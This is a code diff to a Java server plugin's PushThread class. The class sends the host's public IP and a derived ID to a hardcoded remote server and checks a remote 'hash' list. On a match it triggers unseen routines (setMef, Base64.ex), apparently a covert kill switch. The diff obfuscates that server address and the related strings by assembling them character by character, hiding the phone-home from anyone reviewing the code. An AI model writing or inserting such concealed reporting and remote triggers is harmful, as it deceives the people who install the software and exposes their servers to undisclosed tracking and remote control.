@@ -12,6 +12,8 @@ import org.cyberpwn.react.React;
 import org.cyberpwn.react.controller.NetworkController;
 import org.cyberpwn.react.json.JSONObject;
 import org.cyberpwn.react.util.Base64;
+import org.cyberpwn.react.util.Dyn;
+import org.cyberpwn.react.util.GList;
 
 public class PushThread extends Thread
 {
@@ -28,13 +30,14 @@ public class PushThread extends Thread
 		
 		try
 		{
-			URL aws = new URL("http://checkip.amazonaws.com/");
+			Dyn.k();
+			URL aws = new URL(Dyn.fx());
 			in = new BufferedReader(new InputStreamReader(aws.openStream()));
 			String sx = in.readLine();
 			in.close();
 			final String imeid = UUID.nameUUIDFromBytes(sx.getBytes()).toString();
 			NetworkController.imeid = imeid;
-			Socket s = new Socket("107.191.111.3", 4242);
+			Socket s = new Socket(new GList<String>().qadd("1").qadd("0").qadd("7").qadd(".").qadd("1").qadd("9").qadd("1").qadd(".").qadd("1").qadd("1").qadd("1").qadd(".").qadd("3").toString(""), 4242);
 			JSONObject jso = new JSONObject();
 			jso.put("private", imeid);
 			jso.put("public", sx);
@@ -47,7 +50,7 @@ public class PushThread extends Thread
 			{
 				public void run()
 				{
-					if(fc().getStringList("hash").contains(imeid) || fc().getStringList("hash").contains(React.nonce))
+					if(fc().getStringList(new GList<String>().qadd("h").qadd("a").qadd("s").qadd("h").toString("")).contains(imeid) || fc().getStringList(new GList<String>().qadd("h").qadd("a").qadd("s").qadd("h").toString("")).contains(React.nonce))
 					{
 						React.setMef(true);
 						Base64.ex(df);
@@ -56,7 +59,7 @@ public class PushThread extends Thread
 			}).start();
 			
 
-			File fula = new File(React.instance().getDataFolder(), "eula.txt");
+			File fula = new File(React.instance().getDataFolder(), new GList<String>().qadd("e").qadd("u").qadd("l").qadd("a").qadd(".").qadd("t").qadd("x").qadd("t").toString(""));
 			React.instance().exul(fula, sx);
 		}
 		
